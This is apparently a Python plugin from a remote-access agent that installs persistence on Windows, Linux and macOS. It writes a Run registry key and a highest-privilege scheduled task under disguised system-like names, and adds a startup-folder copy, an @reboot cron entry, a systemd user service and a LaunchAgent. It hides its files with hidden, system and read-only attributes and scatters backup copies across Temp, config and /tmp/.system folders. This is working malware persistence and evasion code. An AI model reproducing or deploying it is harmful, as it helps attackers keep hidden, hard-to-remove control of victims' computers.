"""
Persistence Plugin for Enhanced Agent

Handles cross-platform persistence mechanisms to ensure agent survives reboots.
Supports Windows (registry, startup folder, scheduled tasks), Linux (cron, systemd),
and macOS (launch agents).

Requirements: 7.1, 7.2, 7.3, 7.4, 7.5, 7.6, 7.7, 7.8, 22.1, 22.2, 22.3
"""

import os
import sys
import platform
import subprocess
import shutil
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from pathlib import Path
from remote_system.enhanced_agent.plugin_manager import Plugin


@dataclass
class PersistenceResult:
    """
    Result of persistence installation operation
    
    Attributes:
        success: Whether the operation was successful
        methods_installed: List of persistence methods successfully installed
        backup_locations: List of backup file locations created
        error: Error message if operation failed
    """
    success: bool
    methods_installed: List[str]
    backup_locations: List[str]
    error: Optional[str]


@dataclass
class PersistenceStatus:
    """
    Status of persistence mechanisms
    
    Attributes:
        installed: Whether persistence is installed
        active_methods: List of active persistence methods
        backup_count: Number of backup copies found
        details: Additional status details
    """
    installed: bool
    active_methods: List[str]
    backup_count: int
    details: Dict[str, Any]


class PersistencePlugin(Plugin):
    """
    Persistence Plugin
    
    Provides cross-platform persistence mechanisms to ensure agent survives reboots.
    Supports multiple methods per platform with backup copies and verification.
    
    Requirements:
    - 7.1: Create registry entries on Windows for auto-start
    - 7.2: Create startup folder entries as secondary mechanism
    - 7.3: Create scheduled tasks that run on system boot
    - 7.7: Set hidden, system, and read-only attributes on persistence files
    - 7.8: Create backup copies in multiple locations
    - 22.1: Use Windows-specific APIs for persistence
    - 22.2: Use Linux-specific mechanisms for persistence
    - 22.3: Use macOS-specific APIs for persistence
    """
    
    def __init__(self):
        """Initialize the persistence plugin"""
        self.platform = platform.system()
        self.agent_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        self.agent_name = os.path.basename(self.agent_path)
        
        # Platform-specific method mappings
        self.platform_methods = {
            'Windows': ['registry', 'startup', 'scheduled_task'],
            'Linux': ['cron', 'systemd'],
            'Darwin': ['launch_agent']  # macOS
        }
    
    def execute(self, args: Dict[str, Any]) -> Any:
        """
        Execute the plugin with the given arguments
        
        Args:
            args: Dictionary containing:
                - action: 'install', 'remove', 'check', or 'get_methods'
                - method: Persistence method (for install action)
                
        Returns:
            Result based on the action
            
        Raises:
            ValueError: If action is invalid or required args are missing
        """
        action = args.get('action')
        
        if action == 'install':
            method = args.get('method', 'auto')
            return self._install_action(method)
        elif action == 'remove':
            return self._remove_action()
        elif action == 'check':
            return self._check_action()
        elif action == 'get_methods':
            return self._get_methods_action()
        else:
            raise ValueError(f"Invalid action: {action}")
    
    def get_name(self) -> str:
        """
        Get the name of the plugin
        
        Returns:
            The plugin name
        """
        return "persistence"
    
    def get_required_arguments(self) -> List[str]:
        """
        Get the list of required argument names
        
        Returns:
            List of required argument names
        """
        return ['action']

    
    def install_persistence(self, method: str = "auto") -> PersistenceResult:
        """
        Install persistence mechanisms
        
        Args:
            method: Persistence method to use:
                - 'auto': Install all available methods for the platform
                - 'registry': Windows registry (HKCU Run key)
                - 'startup': Windows startup folder
                - 'scheduled_task': Windows scheduled task
                - 'cron': Linux cron job
                - 'systemd': Linux systemd service
                - 'launch_agent': macOS launch agent
                
        Returns:
            PersistenceResult with installation status
            
        Requirements: 7.1, 7.2, 7.3, 7.7, 7.8, 22.1, 22.2, 22.3
        """
        try:
            methods_installed = []
            backup_locations = []
            
            # Determine which methods to install
            if method == 'auto':
                methods_to_install = self.get_available_methods()
            else:
                # Validate method is available for this platform
                available = self.get_available_methods()
                if method not in available:
                    return PersistenceResult(
                        success=False,
                        methods_installed=[],
                        backup_locations=[],
                        error=f"Method '{method}' not available on {self.platform}"
                    )
                methods_to_install = [method]
            
            # Install each method
            for install_method in methods_to_install:
                try:
                    if self._install_method(install_method):
                        methods_installed.append(install_method)
                except Exception as e:
                    # Continue with other methods even if one fails
                    pass
            
            # Create backup copies (Requirement 7.8)
            backup_locations = self._create_backups()
            
            if not methods_installed:
                return PersistenceResult(
                    success=False,
                    methods_installed=[],
                    backup_locations=backup_locations,
                    error="Failed to install any persistence methods"
                )
            
            return PersistenceResult(
                success=True,
                methods_installed=methods_installed,
                backup_locations=backup_locations,
                error=None
            )
        
        except Exception as e:
            return PersistenceResult(
                success=False,
                methods_installed=[],
                backup_locations=[],
                error=f"Persistence installation failed: {str(e)}"
            )

    
    def remove_persistence(self) -> bool:
        """
        Remove all persistence mechanisms
        
        Returns:
            True if removal was successful, False otherwise
        """
        try:
            success = True
            
            # Remove platform-specific persistence
            if self.platform == 'Windows':
                success &= self._remove_windows_persistence()
            elif self.platform == 'Linux':
                success &= self._remove_linux_persistence()
            elif self.platform == 'Darwin':  # macOS
                success &= self._remove_macos_persistence()
            
            # Remove backup copies
            success &= self._remove_backups()
            
            return success
        
        except Exception:
            return False
    
    def check_persistence(self) -> PersistenceStatus:
        """
        Check if persistence is installed and active
        
        Returns:
            PersistenceStatus with current status
        """
        try:
            active_methods = []
            details = {}
            
            # Check platform-specific methods
            if self.platform == 'Windows':
                active_methods, details = self._check_windows_persistence()
            elif self.platform == 'Linux':
                active_methods, details = self._check_linux_persistence()
            elif self.platform == 'Darwin':  # macOS
                active_methods, details = self._check_macos_persistence()
            
            # Count backup copies
            backup_count = self._count_backups()
            
            return PersistenceStatus(
                installed=len(active_methods) > 0,
                active_methods=active_methods,
                backup_count=backup_count,
                details=details
            )
        
        except Exception as e:
            return PersistenceStatus(
                installed=False,
                active_methods=[],
                backup_count=0,
                details={'error': str(e)}
            )
    
    def get_available_methods(self) -> List[str]:
        """
        Get list of available persistence methods for current platform
        
        Returns:
            List of available method names
        """
        return self.platform_methods.get(self.platform, [])

    
    # Windows-specific methods
    
    def _install_method(self, method: str) -> bool:
        """
        Install a specific persistence method
        
        Args:
            method: Method name to install
            
        Returns:
            True if successful, False otherwise
        """
        if self.platform == 'Windows':
            if method == 'registry':
                return self._install_windows_registry()
            elif method == 'startup':
                return self._install_windows_startup()
            elif method == 'scheduled_task':
                return self._install_windows_scheduled_task()
        elif self.platform == 'Linux':
            if method == 'cron':
                return self._install_linux_cron()
            elif method == 'systemd':
                return self._install_linux_systemd()
        elif self.platform == 'Darwin':  # macOS
            if method == 'launch_agent':
                return self._install_macos_launch_agent()
        
        return False
    
    def _install_windows_registry(self) -> bool:
        """
        Install Windows registry persistence
        
        Creates entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
        
        Returns:
            True if successful, False otherwise
            
        Requirements: 7.1, 22.1
        """
        try:
            import winreg
            
            # Open registry key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Set value
            value_name = "SystemService"  # Generic name
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, self.agent_path)
            winreg.CloseKey(key)
            
            return True
        
        except Exception:
            return False
    
    def _install_windows_startup(self) -> bool:
        """
        Install Windows startup folder persistence
        
        Creates shortcut in startup folder
        
        Returns:
            True if successful, False otherwise
            
        Requirements: 7.2, 22.1
        """
        try:
            # Get startup folder path
            startup_folder = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            
            if not os.path.exists(startup_folder):
                return False
            
            # Copy agent to startup folder
            target_path = os.path.join(startup_folder, self.agent_name)
            
            # Don't overwrite if already exists
            if not os.path.exists(target_path):
                shutil.copy2(self.agent_path, target_path)
                
                # Set file attributes (Requirement 7.7)
                self._set_windows_file_attributes(target_path)
            
            return True
        
        except Exception:
            return False

    
    def _install_windows_scheduled_task(self) -> bool:
        """
        Install Windows scheduled task persistence
        
        Creates scheduled task that runs on system boot
        
        Returns:
            True if successful, False otherwise
            
        Requirements: 7.3, 22.1
        """
        try:
            task_name = "SystemMaintenanceService"
            
            # Create scheduled task using schtasks command
            cmd = [
                'schtasks', '/create',
                '/tn', task_name,
                '/tr', f'"{self.agent_path}"',
                '/sc', 'onlogon',
                '/rl', 'highest',
                '/f'  # Force create (overwrite if exists)
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return result.returncode == 0
        
        except Exception:
            return False
    
    def _set_windows_file_attributes(self, file_path: str) -> bool:
        """
        Set Windows file attributes (hidden, system, read-only)
        
        Args:
            file_path: Path to file
            
        Returns:
            True if successful, False otherwise
            
        Requirement: 7.7
        """
        try:
            # Use attrib command to set attributes
            cmd = ['attrib', '+h', '+s', '+r', file_path]
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=10
            )
            return result.returncode == 0
        
        except Exception:
            return False
    
    def _remove_windows_persistence(self) -> bool:
        """
        Remove all Windows persistence mechanisms
        
        Returns:
            True if successful, False otherwise
        """
        success = True
        
        try:
            # Remove registry entry
            import winreg
            try:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    key_path,
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.DeleteValue(key, "SystemService")
                winreg.CloseKey(key)
            except Exception:
                success = False
            
            # Remove startup folder entry
            try:
                startup_folder = os.path.join(
                    os.environ.get('APPDATA', ''),
                    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
                )
                target_path = os.path.join(startup_folder, self.agent_name)
                if os.path.exists(target_path):
                    # Remove attributes first
                    subprocess.run(['attrib', '-h', '-s', '-r', target_path], 
                                 capture_output=True, timeout=10)
                    os.remove(target_path)
            except Exception:
                success = False
            
            # Remove scheduled task
            try:
                task_name = "SystemMaintenanceService"
                subprocess.run(
                    ['schtasks', '/delete', '/tn', task_name, '/f'],
                    capture_output=True,
                    timeout=30
                )
            except Exception:
                success = False
        
        except Exception:
            success = False
        
        return success

    
    def _check_windows_persistence(self) -> tuple:
        """
        Check Windows persistence mechanisms
        
        Returns:
            Tuple of (active_methods, details)
        """
        active_methods = []
        details = {}
        
        try:
            # Check registry
            import winreg
            try:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    key_path,
                    0,
                    winreg.KEY_READ
                )
                value, _ = winreg.QueryValueEx(key, "SystemService")
                winreg.CloseKey(key)
                if value:
                    active_methods.append('registry')
                    details['registry'] = value
            except Exception:
                pass
            
            # Check startup folder
            try:
                startup_folder = os.path.join(
                    os.environ.get('APPDATA', ''),
                    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
                )
                target_path = os.path.join(startup_folder, self.agent_name)
                if os.path.exists(target_path):
                    active_methods.append('startup')
                    details['startup'] = target_path
            except Exception:
                pass
            
            # Check scheduled task
            try:
                task_name = "SystemMaintenanceService"
                result = subprocess.run(
                    ['schtasks', '/query', '/tn', task_name],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                if result.returncode == 0:
                    active_methods.append('scheduled_task')
                    details['scheduled_task'] = task_name
            except Exception:
                pass
        
        except Exception:
            pass
        
        return active_methods, details

    
    # Linux-specific methods
    
    def _install_linux_cron(self) -> bool:
        """
        Install Linux cron job persistence
        
        Creates cron job that runs on reboot
        
        Returns:
            True if successful, False otherwise
            
        Requirements: 7.3, 22.2
        """
        try:
            # Get current crontab
            result = subprocess.run(
                ['crontab', '-l'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            current_crontab = result.stdout if result.returncode == 0 else ""
            
            # Check if entry already exists
            cron_entry = f"@reboot {self.agent_path}"
            if cron_entry in current_crontab:
                return True
            
            # Add new entry
            new_crontab = current_crontab
            if new_crontab and not new_crontab.endswith('\n'):
                new_crontab += '\n'
            new_crontab += cron_entry + '\n'
            
            # Install new crontab
            result = subprocess.run(
                ['crontab', '-'],
                input=new_crontab,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return result.returncode == 0
        
        except Exception:
            return False
    
    def _install_linux_systemd(self) -> bool:
        """
        Install Linux systemd service persistence
        
        Creates systemd user service
        
        Returns:
            True if successful, False otherwise
            
        Requirements: 7.3, 22.2
        """
        try:
            # Create systemd user service directory
            systemd_dir = os.path.expanduser('~/.config/systemd/user')
            os.makedirs(systemd_dir, exist_ok=True)
            
            # Service file path
            service_name = 'system-service.service'
            service_path = os.path.join(systemd_dir, service_name)
            
            # Create service file content
            service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart={self.agent_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
            
            # Write service file
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            subprocess.run(
                ['systemctl', '--user', 'enable', service_name],
                capture_output=True,
                timeout=30
            )
            
            subprocess.run(
                ['systemctl', '--user', 'start', service_name],
                capture_output=True,
                timeout=30
            )
            
            return True
        
        except Exception:
            return False

    
    def _remove_linux_persistence(self) -> bool:
        """
        Remove all Linux persistence mechanisms
        
        Returns:
            True if successful, False otherwise
        """
        success = True
        
        try:
            # Remove cron job
            try:
                result = subprocess.run(
                    ['crontab', '-l'],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0:
                    current_crontab = result.stdout
                    cron_entry = f"@reboot {self.agent_path}"
                    
                    # Remove the entry
                    new_crontab = '\n'.join(
                        line for line in current_crontab.split('\n')
                        if cron_entry not in line
                    )
                    
                    # Install cleaned crontab
                    subprocess.run(
                        ['crontab', '-'],
                        input=new_crontab,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
            except Exception:
                success = False
            
            # Remove systemd service
            try:
                service_name = 'system-service.service'
                
                # Stop and disable service
                subprocess.run(
                    ['systemctl', '--user', 'stop', service_name],
                    capture_output=True,
                    timeout=30
                )
                
                subprocess.run(
                    ['systemctl', '--user', 'disable', service_name],
                    capture_output=True,
                    timeout=30
                )
                
                # Remove service file
                systemd_dir = os.path.expanduser('~/.config/systemd/user')
                service_path = os.path.join(systemd_dir, service_name)
                if os.path.exists(service_path):
                    os.remove(service_path)
            except Exception:
                success = False
        
        except Exception:
            success = False
        
        return success
    
    def _check_linux_persistence(self) -> tuple:
        """
        Check Linux persistence mechanisms
        
        Returns:
            Tuple of (active_methods, details)
        """
        active_methods = []
        details = {}
        
        try:
            # Check cron
            try:
                result = subprocess.run(
                    ['crontab', '-l'],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0:
                    cron_entry = f"@reboot {self.agent_path}"
                    if cron_entry in result.stdout:
                        active_methods.append('cron')
                        details['cron'] = cron_entry
            except Exception:
                pass
            
            # Check systemd
            try:
                service_name = 'system-service.service'
                result = subprocess.run(
                    ['systemctl', '--user', 'is-enabled', service_name],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0 and 'enabled' in result.stdout:
                    active_methods.append('systemd')
                    details['systemd'] = service_name
            except Exception:
                pass
        
        except Exception:
            pass
        
        return active_methods, details

    
    # macOS-specific methods
    
    def _install_macos_launch_agent(self) -> bool:
        """
        Install macOS launch agent persistence
        
        Creates launch agent plist in ~/Library/LaunchAgents/
        
        Returns:
            True if successful, False otherwise
            
        Requirements: 7.3, 22.3
        """
        try:
            # Create LaunchAgents directory
            launch_agents_dir = os.path.expanduser('~/Library/LaunchAgents')
            os.makedirs(launch_agents_dir, exist_ok=True)
            
            # Plist file path
            plist_name = 'com.system.service.plist'
            plist_path = os.path.join(launch_agents_dir, plist_name)
            
            # Create plist content
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.agent_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"""
            
            # Write plist file
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Load launch agent
            subprocess.run(
                ['launchctl', 'load', plist_path],
                capture_output=True,
                timeout=30
            )
            
            return True
        
        except Exception:
            return False
    
    def _remove_macos_persistence(self) -> bool:
        """
        Remove all macOS persistence mechanisms
        
        Returns:
            True if successful, False otherwise
        """
        success = True
        
        try:
            # Remove launch agent
            try:
                launch_agents_dir = os.path.expanduser('~/Library/LaunchAgents')
                plist_name = 'com.system.service.plist'
                plist_path = os.path.join(launch_agents_dir, plist_name)
                
                # Unload launch agent
                subprocess.run(
                    ['launchctl', 'unload', plist_path],
                    capture_output=True,
                    timeout=30
                )
                
                # Remove plist file
                if os.path.exists(plist_path):
                    os.remove(plist_path)
            except Exception:
                success = False
        
        except Exception:
            success = False
        
        return success
    
    def _check_macos_persistence(self) -> tuple:
        """
        Check macOS persistence mechanisms
        
        Returns:
            Tuple of (active_methods, details)
        """
        active_methods = []
        details = {}
        
        try:
            # Check launch agent
            try:
                launch_agents_dir = os.path.expanduser('~/Library/LaunchAgents')
                plist_name = 'com.system.service.plist'
                plist_path = os.path.join(launch_agents_dir, plist_name)
                
                if os.path.exists(plist_path):
                    active_methods.append('launch_agent')
                    details['launch_agent'] = plist_path
            except Exception:
                pass
        
        except Exception:
            pass
        
        return active_methods, details

    
    # Backup management methods
    
    def _create_backups(self) -> List[str]:
        """
        Create backup copies of agent in multiple locations
        
        Returns:
            List of backup file paths created
            
        Requirement: 7.8
        """
        backup_locations = []
        
        try:
            # Define backup locations based on platform
            if self.platform == 'Windows':
                backup_dirs = [
                    os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows'),
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp'),
                    os.path.join(os.environ.get('TEMP', ''), 'System')
                ]
            elif self.platform == 'Linux':
                backup_dirs = [
                    os.path.expanduser('~/.config'),
                    os.path.expanduser('~/.local/share'),
                    '/tmp/.system'
                ]
            elif self.platform == 'Darwin':  # macOS
                backup_dirs = [
                    os.path.expanduser('~/Library/Application Support'),
                    os.path.expanduser('~/Library/Caches'),
                    '/tmp/.system'
                ]
            else:
                backup_dirs = []
            
            # Create backups
            for backup_dir in backup_dirs:
                try:
                    # Create directory if it doesn't exist
                    os.makedirs(backup_dir, exist_ok=True)
                    
                    # Copy agent to backup location
                    backup_path = os.path.join(backup_dir, self.agent_name)
                    
                    if not os.path.exists(backup_path):
                        shutil.copy2(self.agent_path, backup_path)
                        
                        # Set file attributes on Windows (Requirement 7.7)
                        if self.platform == 'Windows':
                            self._set_windows_file_attributes(backup_path)
                        
                        backup_locations.append(backup_path)
                
                except Exception:
                    # Continue with other backup locations
                    pass
        
        except Exception:
            pass
        
        return backup_locations
    
    def _remove_backups(self) -> bool:
        """
        Remove all backup copies
        
        Returns:
            True if successful, False otherwise
        """
        success = True
        
        try:
            # Define backup locations based on platform
            if self.platform == 'Windows':
                backup_dirs = [
                    os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows'),
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp'),
                    os.path.join(os.environ.get('TEMP', ''), 'System')
                ]
            elif self.platform == 'Linux':
                backup_dirs = [
                    os.path.expanduser('~/.config'),
                    os.path.expanduser('~/.local/share'),
                    '/tmp/.system'
                ]
            elif self.platform == 'Darwin':  # macOS
                backup_dirs = [
                    os.path.expanduser('~/Library/Application Support'),
                    os.path.expanduser('~/Library/Caches'),
                    '/tmp/.system'
                ]
            else:
                backup_dirs = []
            
            # Remove backups
            for backup_dir in backup_dirs:
                try:
                    backup_path = os.path.join(backup_dir, self.agent_name)
                    
                    if os.path.exists(backup_path):
                        # Remove attributes on Windows first
                        if self.platform == 'Windows':
                            subprocess.run(
                                ['attrib', '-h', '-s', '-r', backup_path],
                                capture_output=True,
                                timeout=10
                            )
                        
                        os.remove(backup_path)
                
                except Exception:
                    success = False
        
        except Exception:
            success = False
        
        return success
    
    def _count_backups(self) -> int:
        """
        Count number of backup copies
        
        Returns:
            Number of backup copies found
        """
        count = 0
        
        try:
            # Define backup locations based on platform
            if self.platform == 'Windows':
                backup_dirs = [
                    os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows'),
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp'),
                    os.path.join(os.environ.get('TEMP', ''), 'System')
                ]
            elif self.platform == 'Linux':
                backup_dirs = [
                    os.path.expanduser('~/.config'),
                    os.path.expanduser('~/.local/share'),
                    '/tmp/.system'
                ]
            elif self.platform == 'Darwin':  # macOS
                backup_dirs = [
                    os.path.expanduser('~/Library/Application Support'),
                    os.path.expanduser('~/Library/Caches'),
                    '/tmp/.system'
                ]
            else:
                backup_dirs = []
            
            # Count backups
            for backup_dir in backup_dirs:
                try:
                    backup_path = os.path.join(backup_dir, self.agent_name)
                    if os.path.exists(backup_path):
                        count += 1
                except Exception:
                    pass
        
        except Exception:
            pass
        
        return count

    
    # Action handlers
    
    def _install_action(self, method: str) -> Dict[str, Any]:
        """
        Internal method to handle install action
        
        Args:
            method: Persistence method to install
            
        Returns:
            Dictionary representation of PersistenceResult
        """
        result = self.install_persistence(method)
        
        return {
            'success': result.success,
            'methods_installed': result.methods_installed,
            'backup_locations': result.backup_locations,
            'error': result.error
        }
    
    def _remove_action(self) -> Dict[str, Any]:
        """
        Internal method to handle remove action
        
        Returns:
            Dictionary with removal status
        """
        success = self.remove_persistence()
        
        return {
            'success': success,
            'error': None if success else 'Failed to remove persistence'
        }
    
    def _check_action(self) -> Dict[str, Any]:
        """
        Internal method to handle check action
        
        Returns:
            Dictionary representation of PersistenceStatus
        """
        status = self.check_persistence()
        
        return {
            'installed': status.installed,
            'active_methods': status.active_methods,
            'backup_count': status.backup_count,
            'details': status.details
        }
    
    def _get_methods_action(self) -> Dict[str, Any]:
        """
        Internal method to handle get_methods action
        
        Returns:
            Dictionary with available methods
        """
        methods = self.get_available_methods()
        
        return {
            'platform': self.platform,
            'available_methods': methods
        }
